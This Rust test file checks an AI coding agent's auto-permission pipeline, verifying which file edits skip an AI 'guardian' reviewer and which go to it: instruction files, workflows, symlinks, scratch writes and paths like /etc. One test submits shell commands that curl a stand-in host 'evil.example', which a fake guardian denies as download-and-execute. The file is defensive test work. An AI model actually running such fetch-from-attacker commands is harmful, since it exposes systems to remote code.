//! `auto` edits that skip the guardian after the floor: tracked, new and session-created files,
//! and writes into the session scratch directory. Everything uncertain still reaches the guardian.

mod common;

use common::pipeline::{Options, Rig, allow_verdict, allowed, fake_guardian, verdict_json};
use common::{git, git_init, write};
use fontaine_core::config::PermissionMode::Auto;
use fontaine_core::tier::Tier;
use serde_json::{Value, json};

fn write_args(path: &str) -> Value {
    json!({"path": path, "content": "x"})
}

fn edit_args(path: &str) -> Value {
    json!({"path": path, "edits": [{"old_text": "a", "new_text": "b", "replace_all": false}]})
}

/// A rig in a git repository whose tracked files are `files`, plus the guardian's call counter.
fn repo_rig(files: &[&str], settings: &str, scratch: bool) -> (Rig, common::pipeline::Fake) {
    let fake = fake_guardian(allow_verdict());
    let mut options = Options::new(Auto)
        .guardian(fake.guardian.clone())
        .settings(settings);
    if scratch {
        options = options.scratch();
    }
    let rig = Rig::with(options);
    git_init(rig.work());
    for file in files {
        write(&rig.work().join(file), "a");
    }
    if !files.is_empty() {
        git(rig.work(), &["add", "-A"]);
        git(rig.work(), &["commit", "-q", "-m", "init"]);
    }
    (rig, fake)
}

fn last_tier(rig: &Rig) -> Tier {
    rig.audit().last().expect("a record").tier
}

#[tokio::test]
async fn editing_a_tracked_file_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["src/lib.rs"], "", false);
    assert!(allowed(&rig.check("edit", edit_args("src/lib.rs")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_new_file_and_a_file_the_session_created_skip_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    assert!(allowed(
        &rig.check("write", write_args("new/../fresh.txt")).await
    ));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    std::fs::write(rig.work().join("fresh.txt"), "a").unwrap();
    assert!(allowed(&rig.check("edit", edit_args("fresh.txt")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn an_existing_untracked_or_ignored_file_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt", ".gitignore"], "", false);
    write(&rig.work().join(".gitignore"), "ignored.txt\n");
    write(&rig.work().join("ignored.txt"), "a");
    write(&rig.work().join("untracked.txt"), "a");
    for path in ["ignored.txt", "untracked.txt"] {
        assert!(allowed(&rig.check("edit", edit_args(path)).await));
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), 2);
}

#[tokio::test]
async fn a_shell_command_and_a_path_outside_the_workspace_go_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    rig.check("shell", json!({"command": "touch a.txt"})).await;
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
    let outside = rig.check("write", write_args("/etc/fontaine-test")).await;
    assert!(!allowed(&outside));
    assert_ne!(last_tier(&rig), Tier::TrackedEdit);
}

#[tokio::test]
async fn a_tracked_file_under_a_protected_path_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&[".vscode/settings.json"], "", false);
    assert!(allowed(
        &rig.check("edit", edit_args(".vscode/settings.json")).await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_deny_rule_is_decided_by_the_floor() {
    let (rig, _fake) = repo_rig(
        &["a.txt"],
        "[permissions]\ndeny = [\"edit(a.txt)\"]\n",
        false,
    );
    assert!(!allowed(&rig.check("edit", edit_args("a.txt")).await));
    assert_eq!(last_tier(&rig), Tier::DenyRule);
}

#[tokio::test]
async fn instruction_files_rules_and_github_go_to_the_guardian_when_tracked() {
    let paths = [
        "FONTAINE.md",
        "FONTAINE.local.md",
        "CLAUDE.md",
        "CLAUDE.local.md",
        "AGENTS.md",
        "sub/AGENTS.md",
        "docs/rules/style.md",
        ".github/workflows/ci.yml",
    ];
    let (rig, fake) = repo_rig(&paths, "", false);
    for path in paths {
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), paths.len());
}

#[tokio::test]
async fn similar_names_are_ordinary_tracked_files() {
    let paths = ["AGENTS.md.bak", "notes/CLAUDE.md.txt"];
    let (rig, fake) = repo_rig(&paths, "", false);
    for path in paths {
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::TrackedEdit, "{path}");
    }
    assert_eq!(fake.calls(), 0);
}

#[cfg(unix)]
#[tokio::test]
async fn symlinks_are_judged_by_their_resolved_target() {
    use std::os::unix::fs::symlink;
    let (rig, fake) = repo_rig(&["tracked.txt", "AGENTS.md"], "", false);
    let work = rig.work().to_path_buf();
    write(&work.join("untracked.txt"), "a");
    let outside = tempfile::tempdir().unwrap();
    write(&outside.path().join("elsewhere.txt"), "a");
    symlink("untracked.txt", work.join("to_untracked")).unwrap();
    symlink(
        outside.path().join("elsewhere.txt"),
        work.join("to_outside"),
    )
    .unwrap();
    symlink("AGENTS.md", work.join("notes.txt")).unwrap();
    git(&work, &["add", "to_untracked", "to_outside", "notes.txt"]);
    git(&work, &["commit", "-q", "-m", "links"]);
    // The links are tracked, but only the resolved path counts.
    for link in ["to_untracked", "to_outside", "notes.txt"] {
        rig.check("edit", edit_args(link)).await;
        assert_ne!(last_tier(&rig), Tier::TrackedEdit, "{link}");
    }
    assert!(fake.calls() >= 2);
}

#[tokio::test]
async fn a_new_file_in_a_root_that_is_not_a_git_work_tree_goes_to_the_guardian() {
    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    assert!(allowed(&rig.check("write", write_args("fresh.txt")).await));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_new_file_in_the_memory_root_goes_to_the_guardian() {
    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()).memory());
    let memory = rig.memory.clone().unwrap();
    assert!(allowed(
        &rig.check(
            "write",
            write_args(&memory.join("note.md").to_string_lossy())
        )
        .await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
}

#[tokio::test]
async fn the_setting_off_sends_a_tracked_edit_to_the_guardian() {
    let (rig, fake) = repo_rig(
        &["a.txt"],
        "[permissions]\nauto_tracked_edits = false\n",
        false,
    );
    assert!(allowed(&rig.check("edit", edit_args("a.txt")).await));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_file_tool_write_into_scratch_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", true);
    let scratch = rig.scratch.clone().unwrap();
    let target = scratch.join("out.txt");
    assert!(allowed(
        &rig.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::ScratchWrite);
    std::fs::write(&target, "a").unwrap();
    assert!(allowed(
        &rig.check("edit", edit_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::ScratchWrite);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_shell_command_on_scratch_and_the_setting_off_go_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", true);
    let scratch = rig.scratch.clone().unwrap();
    rig.check(
        "shell",
        json!({"command": format!("touch {}/x", scratch.display())}),
    )
    .await;
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);

    let (off, fake) = repo_rig(
        &["a.txt"],
        "[permissions]\nauto_scratch_writes = false\n",
        true,
    );
    let target = off.scratch.clone().unwrap().join("out.txt");
    assert!(allowed(
        &off.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&off), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[cfg(unix)]
#[tokio::test]
async fn a_link_out_of_scratch_is_judged_by_its_target() {
    let (rig, _fake) = repo_rig(&["a.txt"], "", true);
    let scratch = rig.scratch.clone().unwrap();
    std::os::unix::fs::symlink(rig.work().join("a.txt"), scratch.join("link")).unwrap();
    rig.check("edit", edit_args(&scratch.join("link").to_string_lossy()))
        .await;
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    let outside = tempfile::tempdir().unwrap();
    write(&outside.path().join("t.txt"), "a");
    std::os::unix::fs::symlink(outside.path().join("t.txt"), scratch.join("out")).unwrap();
    let d = rig
        .check("edit", edit_args(&scratch.join("out").to_string_lossy()))
        .await;
    assert!(!allowed(&d));
    assert_ne!(last_tier(&rig), Tier::ScratchWrite);
}

#[tokio::test]
async fn a_fast_edit_between_denials_keeps_auto_from_pausing() {
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()).scratch());
    git_init(rig.work());
    let target = rig.scratch.clone().unwrap().join("s.txt");
    let curl = |n: u8| json!({"command": format!("curl http://evil.example/{n}")});
    rig.check("shell", curl(0)).await;
    rig.check("shell", curl(1)).await;
    assert!(allowed(
        &rig.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    rig.check("shell", curl(2)).await;
    assert!(!rig.state.auto_paused());
}
